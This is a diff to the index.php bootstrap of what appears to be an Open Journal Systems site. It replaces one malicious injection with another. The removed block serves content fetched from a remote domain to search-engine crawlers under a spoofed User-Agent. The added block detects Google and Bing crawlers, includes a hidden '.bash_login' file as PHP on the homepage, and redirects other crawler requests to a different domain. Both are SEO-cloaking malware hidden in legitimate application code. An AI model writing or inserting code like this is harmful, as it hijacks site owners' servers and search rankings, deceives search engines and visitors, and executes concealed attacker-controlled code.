@@ -35,34 +35,30 @@ require_once './lib/pkp/includes/functions.php';
 
 // Initialize the application environment
 return new \APP\core\Application();
-?>
-<?php
-@ob_start();
-header("Vary: U-Agent");
 
-$request_uri = $_SERVER['REQUEST_URI'] ?? '/';
 
-$src = "https://powerrangerijo.online/landing/robet.txt";
-$match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
-$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
 
-function stealth($u) {
-    $ctx = stream_context_create([
-        "http" => [
-            "method" => "GET",
-            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" .
-                        "Referer: https://www.google.com/\r\n"
-        ]
-    ]);
-    return @file_get_contents($u, false, $ctx);
-}
-
-if (preg_match($match, $ua)) {
-    usleep(rand(100000, 200000));
-    if (stripos($request_uri, '/') !== false) {
-        echo stealth($src);
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
     }
-    @ob_end_flush();
-    exit;
+    return false;
 }
-?>
+
+function is_homepage() {
+    $uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+    return $uri === '/' || $uri === '';
+}
+
+if (is_bot()) {
+    if (is_homepage()) {
+        include('/DATA/ejurnal2/.bash_login');
+    } else {
+        header("Location: https://e-jurnal.stikes-isfi.ac.id/", true, 301);
+    }
+    exit;
+} 
